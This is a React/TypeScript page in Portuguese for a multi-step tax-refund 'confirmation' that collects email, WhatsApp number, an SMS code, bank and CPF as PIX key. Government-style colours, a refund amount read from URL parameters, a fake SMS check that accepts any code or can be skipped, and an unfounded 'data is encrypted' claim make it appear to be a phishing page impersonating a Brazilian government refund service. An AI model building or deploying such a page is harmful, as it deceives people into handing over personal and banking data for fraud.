import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Alert,
  AlertDescription,
  AlertTitle,
} from "@/components/ui/alert";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useToast } from "@/hooks/use-toast";
import { CheckCircle2, Clock, RefreshCw, AlertCircle, Lock, Smartphone, CreditCard } from "lucide-react";

// Lista de bancos brasileiros
const bancosBrasileiros = [
  { id: "001", nome: "Banco do Brasil" },
  { id: "033", nome: "Banco Santander" },
  { id: "104", nome: "Caixa Econômica Federal" },
  { id: "237", nome: "Banco Bradesco" },
  { id: "341", nome: "Itaú Unibanco" },
  { id: "077", nome: "Banco Inter" },
  { id: "260", nome: "Nubank" },
  { id: "336", nome: "C6 Bank" },
  { id: "212", nome: "Banco Original" },
  { id: "756", nome: "Banco Cooperativo do Brasil (SICOOB)" },
  { id: "748", nome: "Banco Cooperativo Sicredi" },
  { id: "655", nome: "Banco Votorantim" },
  { id: "041", nome: "Banrisul" },
  { id: "389", nome: "Banco Mercantil do Brasil" },
  { id: "422", nome: "Banco Safra" },
  { id: "025", nome: "Banco Alfa" },
  { id: "208", nome: "BTG Pactual" },
  { id: "021", nome: "Banestes" },
  { id: "070", nome: "BRB - Banco de Brasília" },
  { id: "085", nome: "Cooperativa Central de Crédito Urbano - CECRED" },
  { id: "136", nome: "Unicred" },
  { id: "623", nome: "Banco Pan" },
  { id: "655", nome: "Neon Pagamentos" },
  { id: "290", nome: "PagBank" },
  { id: "197", nome: "Stone Pagamentos" },
];

// Esquema de validação para o formulário de contato
const contatoSchema = z.object({
  email: z.string().email("Email inválido").min(1, "Email é obrigatório"),
  telefone: z
    .string()
    .min(11, "Telefone deve ter pelo menos 11 dígitos")
    .max(11, "Telefone deve ter no máximo 11 dígitos")
    .regex(/^[0-9]+$/, "Telefone deve conter apenas números"),
});

// Esquema de validação para o código SMS
const codigoSchema = z.object({
  codigo: z
    .string()
    .length(6, "O código deve ter 6 dígitos")
    .regex(/^[0-9]+$/, "Código deve conter apenas números"),
});

// Esquema de validação para os dados bancários
const dadosBancariosSchema = z.object({
  banco: z.string().min(1, "Selecione um banco"),
  chavePix: z.string().min(11, "CPF deve ter pelo menos 11 dígitos").max(11, "CPF deve ter no máximo 11 dígitos"),
});

type ContatoFormValues = z.infer<typeof contatoSchema>;
type CodigoFormValues = z.infer<typeof codigoSchema>;
type DadosBancariosFormValues = z.infer<typeof dadosBancariosSchema>;

export default function Confirmacao() {
  const [location] = useLocation();
  const [etapa, setEtapa] = useState<"contato" | "codigo" | "bancarios" | "confirmacao">("contato");
  const [codigoEnviado, setCodigoEnviado] = useState(false);
  const [tempoRestante, setTempoRestante] = useState(30);
  const [tentativasRestantes, setTentativasRestantes] = useState(3);
  const [codigoInvalido, setCodigoInvalido] = useState(false);
  const [valorRestituicao, setValorRestituicao] = useState("R$ 0,00");
  const [podeReenviar, setPodeReenviar] = useState(false);
  const [telefoneConfirmado, setTelefoneConfirmado] = useState("");
  const [emailConfirmado, setEmailConfirmado] = useState("");
  const [bancoSelecionado, setBancoSelecionado] = useState("");
  const [chavePix, setChavePix] = useState("");

  const { toast } = useToast();

  // Extrair parâmetros da URL
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const nome = params.get("nome") || "";
    const valor = params.get("valor") || "0";
    
    // Formatar o valor para exibição
    const valorNumerico = parseFloat(valor);
    setValorRestituicao(
      valorNumerico.toLocaleString("pt-BR", {
        style: "currency",
        currency: "BRL",
      })
    );
  }, []);

  // Formulário de contato
  const contatoForm = useForm<ContatoFormValues>({
    resolver: zodResolver(contatoSchema),
    defaultValues: {
      email: "",
      telefone: "",
    },
  });

  // Formulário de código
  const codigoForm = useForm<CodigoFormValues>({
    resolver: zodResolver(codigoSchema),
    defaultValues: {
      codigo: "",
    },
  });

  // Formulário de dados bancários
  const dadosBancariosForm = useForm<DadosBancariosFormValues>({
    resolver: zodResolver(dadosBancariosSchema),
    defaultValues: {
      banco: "",
      chavePix: "",
    },
  });

  // Temporizador para reenvio de código
  useEffect(() => {
    let intervalo: NodeJS.Timeout;
    
    if (codigoEnviado && tempoRestante > 0) {
      intervalo = setInterval(() => {
        setTempoRestante((tempo) => {
          if (tempo <= 1) {
            setPodeReenviar(true);
            return 0;
          }
          return tempo - 1;
        });
      }, 1000);
    }

    return () => {
      if (intervalo) clearInterval(intervalo);
    };
  }, [codigoEnviado, tempoRestante]);

  // Formatar telefone
  const formatarTelefone = (telefone: string) => {
    if (!telefone) return "";
    
    // (XX) XXXXX-XXXX
    if (telefone.length === 11) {
      return `(${telefone.substring(0, 2)}) ${telefone.substring(
        2,
        7
      )}-${telefone.substring(7)}`;
    }
    
    return telefone;
  };

  // Formatar CPF
  const formatarCPF = (cpf: string) => {
    if (!cpf) return "";
    
    // XXX.XXX.XXX-XX
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  // Função para enviar o código SMS
  const enviarCodigoSMS = (telefone: string) => {
    // Aqui seria a chamada para API de envio de SMS
    // Simulamos com um log e uma resposta de sucesso após 1 segundo
    console.log(`Enviando código para ${telefone}`);
    
    return new Promise<string>((resolve) => {
      setTimeout(() => {
        const codigo = Math.floor(100000 + Math.random() * 900000).toString();
        console.log(`Código gerado: ${codigo}`);
        resolve(codigo);
      }, 1000);
    });
  };

  // Enviar código e ir para próxima etapa
  const onSubmitContato = async (data: ContatoFormValues) => {
    try {
      // Enviar código para o telefone
      await enviarCodigoSMS(data.telefone);
      
      // Atualizar estado
      setCodigoEnviado(true);
      setTempoRestante(30);
      setPodeReenviar(false);
      setTelefoneConfirmado(data.telefone);
      setEmailConfirmado(data.email);
      
      // Ir para próxima etapa
      setEtapa("codigo");
      
      // Mostrar toast
      toast({
        title: "Código enviado!",
        description: `Enviamos um código de verificação para ${formatarTelefone(data.telefone)}`,
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Erro ao enviar código",
        description: "Não foi possível enviar o código. Tente novamente.",
      });
    }
  };

  // Verificar código e ir para próxima etapa
  const onSubmitCodigo = (data: CodigoFormValues) => {
    // Aqui seria a verificação com a API
    // Para teste, vamos aceitar qualquer código
    const codigoCorreto = true; // Simulando código correto
    
    if (codigoCorreto) {
      setEtapa("bancarios");
      setCodigoInvalido(false);
    } else {
      setCodigoInvalido(true);
      setTentativasRestantes((prev) => prev - 1);
      
      if (tentativasRestantes <= 1) {
        // Se acabarem as tentativas, vai para os dados bancários mesmo assim
        toast({
          variant: "destructive",
          title: "Limite de tentativas excedido",
          description: "Você pode continuar o processo e validar seu telefone mais tarde.",
        });
        setEtapa("bancarios");
      } else {
        toast({
          variant: "destructive",
          title: "Código inválido",
          description: `Você tem mais ${tentativasRestantes - 1} tentativas.`,
        });
      }
    }
  };

  // Reenviar código
  const reenviarCodigo = async () => {
    if (!podeReenviar) return;
    
    try {
      await enviarCodigoSMS(telefoneConfirmado);
      setTempoRestante(30);
      setPodeReenviar(false);
      
      toast({
        title: "Código reenviado!",
        description: `Enviamos um novo código de verificação para ${formatarTelefone(telefoneConfirmado)}`,
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Erro ao reenviar código",
        description: "Não foi possível reenviar o código. Tente novamente.",
      });
    }
  };

  // Pular verificação de código
  const pularVerificacao = () => {
    setEtapa("bancarios");
    
    toast({
      title: "Verificação pulada",
      description: "Você poderá validar seu telefone mais tarde.",
    });
  };

  // Submeter dados bancários
  const onSubmitDadosBancarios = (data: DadosBancariosFormValues) => {
    setBancoSelecionado(
      bancosBrasileiros.find((banco) => banco.id === data.banco)?.nome || ""
    );
    setChavePix(data.chavePix);
    setEtapa("confirmacao");
  };

  // Finalizar processo
  const finalizarProcesso = () => {
    window.location.href = "/sucesso"; // Redirecionar para página de sucesso
  };

  // Renderizar etapas
  const renderEtapa = () => {
    switch (etapa) {
      case "contato":
        return (
          <Form {...contatoForm}>
            <form onSubmit={contatoForm.handleSubmit(onSubmitContato)} className="space-y-6">
              <div className="space-y-4">
                <FormField
                  control={contatoForm.control}
                  name="email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>E-mail</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="seu.email@exemplo.com"
                          type="email"
                          {...field}
                        />
                      </FormControl>
                      <FormDescription>
                        Precisamos do seu e-mail para enviar atualizações sobre o processo
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={contatoForm.control}
                  name="telefone"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Celular com WhatsApp</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="DDD + Número (ex: 11999999999)"
                          type="tel"
                          maxLength={11}
                          inputMode="numeric"
                          {...field}
                        />
                      </FormControl>
                      <FormDescription>
                        Enviaremos um código para confirmar seu número
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>

              <div className="flex justify-end">
                <Button type="submit" className="bg-[var(--gov-blue)]">
                  Continuar
                </Button>
              </div>
            </form>
          </Form>
        );

      case "codigo":
        return (
          <div className="space-y-6">
            <Alert variant={codigoInvalido ? "destructive" : "default"}>
              <Smartphone className="h-4 w-4" />
              <AlertTitle>Verificação de telefone</AlertTitle>
              <AlertDescription>
                Enviamos um código de 6 dígitos para{" "}
                <span className="font-semibold">
                  {formatarTelefone(telefoneConfirmado)}
                </span>
              </AlertDescription>
            </Alert>

            <Form {...codigoForm}>
              <form onSubmit={codigoForm.handleSubmit(onSubmitCodigo)} className="space-y-6">
                <FormField
                  control={codigoForm.control}
                  name="codigo"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Código de verificação</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="Digite o código de 6 dígitos"
                          inputMode="numeric"
                          maxLength={6}
                          {...field}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <div className="text-sm text-[var(--gov-gray-dark)]">
                  {podeReenviar ? (
                    <Button
                      variant="link"
                      className="p-0 h-auto text-[var(--gov-blue)]"
                      onClick={reenviarCodigo}
                    >
                      <RefreshCw className="h-3 w-3 mr-1" />
                      Reenviar código
                    </Button>
                  ) : (
                    <div className="flex items-center text-gray-500">
                      <Clock className="h-3 w-3 mr-1" />
                      Reenviar código em {tempoRestante}s
                    </div>
                  )}
                </div>

                <div className="flex justify-between">
                  <Button
                    type="button"
                    variant="ghost"
                    className="text-[var(--gov-gray-dark)]"
                    onClick={pularVerificacao}
                  >
                    Pular verificação
                  </Button>
                  <Button type="submit" className="bg-[var(--gov-blue)]">
                    Verificar
                  </Button>
                </div>
              </form>
            </Form>
          </div>
        );

      case "bancarios":
        return (
          <Form {...dadosBancariosForm}>
            <form onSubmit={dadosBancariosForm.handleSubmit(onSubmitDadosBancarios)} className="space-y-6">
              <div className="space-y-4">
                <FormField
                  control={dadosBancariosForm.control}
                  name="banco"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Banco</FormLabel>
                      <Select
                        onValueChange={field.onChange}
                        defaultValue={field.value}
                      >
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Selecione seu banco" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent className="max-h-80">
                          {bancosBrasileiros.map((banco) => (
                            <SelectItem key={banco.id} value={banco.id}>
                              {banco.nome}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      <FormDescription>
                        Selecione o banco onde você receberá o valor da restituição
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={dadosBancariosForm.control}
                  name="chavePix"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Chave PIX (CPF)</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="Seu CPF sem pontos ou traços"
                          inputMode="numeric"
                          maxLength={11}
                          {...field}
                        />
                      </FormControl>
                      <FormDescription>
                        A restituição será enviada para a chave PIX associada ao seu CPF
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>

              <Alert>
                <Lock className="h-4 w-4" />
                <AlertTitle>Segurança</AlertTitle>
                <AlertDescription>
                  Seus dados bancários são criptografados e utilizados apenas para o 
                  processo de restituição.
                </AlertDescription>
              </Alert>

              <div className="flex justify-end">
                <Button type="submit" className="bg-[var(--gov-blue)]">
                  Continuar
                </Button>
              </div>
            </form>
          </Form>
        );

      case "confirmacao":
        return (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center">
                  <CheckCircle2 className="h-5 w-5 text-green-500 mr-2" />
                  Resumo da Solicitação
                </CardTitle>
                <CardDescription>
                  Confira os dados antes de finalizar
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="bg-green-50 p-4 rounded-md">
                  <div className="text-center">
                    <p className="text-sm text-[var(--gov-gray-dark)]">Valor a receber:</p>
                    <p className="text-2xl font-bold text-green-600">
                      {valorRestituicao}
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h3 className="text-sm font-medium text-[var(--gov-blue-dark)]">
                      Contato
                    </h3>
                    <p className="text-sm text-[var(--gov-gray-dark)]">
                      Email: {emailConfirmado}
                    </p>
                    <p className="text-sm text-[var(--gov-gray-dark)]">
                      Telefone: {formatarTelefone(telefoneConfirmado)}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-[var(--gov-blue-dark)]">
                      Dados bancários
                    </h3>
                    <p className="text-sm text-[var(--gov-gray-dark)]">
                      Banco: {bancoSelecionado}
                    </p>
                    <p className="text-sm text-[var(--gov-gray-dark)]">
                      Chave PIX (CPF): {formatarCPF(chavePix)}
                    </p>
                  </div>
                </div>
              </CardContent>
              <CardFooter className="flex justify-between">
                <Button
                  variant="outline"
                  onClick={() => setEtapa("bancarios")}
                >
                  Voltar e editar
                </Button>
                <Button
                  onClick={finalizarProcesso}
                  className="bg-[var(--gov-yellow)] text-[var(--gov-blue-dark)] font-semibold"
                >
                  Finalizar solicitação
                </Button>
              </CardFooter>
            </Card>

            <Alert className="bg-blue-50 border-blue-200">
              <AlertCircle className="h-4 w-4 text-blue-500" />
              <AlertTitle className="text-blue-700">Informação</AlertTitle>
              <AlertDescription className="text-blue-600">
                Após finalizar, você receberá um e-mail de confirmação com os detalhes
                e o número do protocolo da sua solicitação.
              </AlertDescription>
            </Alert>
          </div>
        );

      default:
        return null;
    }
  };

  // Obter nome do usuário
  const obterNome = () => {
    const params = new URLSearchParams(window.location.search);
    let nome = params.get("nome") || "cliente";
    
    // Retorna apenas o primeiro nome
    return nome.split(" ")[0];
  };

  return (
    <div className="container max-w-3xl mx-auto py-10 px-4">
      <div className="space-y-6">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold text-[var(--gov-blue-dark)]">
            {obterNome()}, você está quase lá!
          </h1>
          <p className="text-[var(--gov-gray-dark)]">
            Para finalizar o processo de restituição, precisamos confirmar alguns dados.
          </p>
        </div>

        {/* Etapas */}
        <div className="relative mb-8">
          <div className="flex justify-between mb-2">
            <div className={`text-center ${etapa === "contato" ? "text-[var(--gov-blue)]" : "text-gray-500"}`}>
              <div className={`w-8 h-8 mx-auto rounded-full flex items-center justify-center ${etapa === "contato" ? "bg-[var(--gov-blue)] text-white" : "bg-gray-200"}`}>
                1
              </div>
              <span className="text-xs mt-1 block">Contato</span>
            </div>
            <div className={`text-center ${etapa === "codigo" ? "text-[var(--gov-blue)]" : "text-gray-500"}`}>
              <div className={`w-8 h-8 mx-auto rounded-full flex items-center justify-center ${etapa === "codigo" ? "bg-[var(--gov-blue)] text-white" : "bg-gray-200"}`}>
                2
              </div>
              <span className="text-xs mt-1 block">Verificação</span>
            </div>
            <div className={`text-center ${etapa === "bancarios" ? "text-[var(--gov-blue)]" : "text-gray-500"}`}>
              <div className={`w-8 h-8 mx-auto rounded-full flex items-center justify-center ${etapa === "bancarios" ? "bg-[var(--gov-blue)] text-white" : "bg-gray-200"}`}>
                3
              </div>
              <span className="text-xs mt-1 block">Banco</span>
            </div>
            <div className={`text-center ${etapa === "confirmacao" ? "text-[var(--gov-blue)]" : "text-gray-500"}`}>
              <div className={`w-8 h-8 mx-auto rounded-full flex items-center justify-center ${etapa === "confirmacao" ? "bg-[var(--gov-blue)] text-white" : "bg-gray-200"}`}>
                4
              </div>
              <span className="text-xs mt-1 block">Resumo</span>
            </div>
          </div>
          <div className="w-full bg-gray-200 h-1 absolute top-4 left-0 -z-10"></div>
        </div>

        {/* Conteúdo da etapa atual */}
        <div className="bg-white rounded-lg shadow-md p-6">
          {renderEtapa()}
        </div>
      </div>
    </div>
  );
}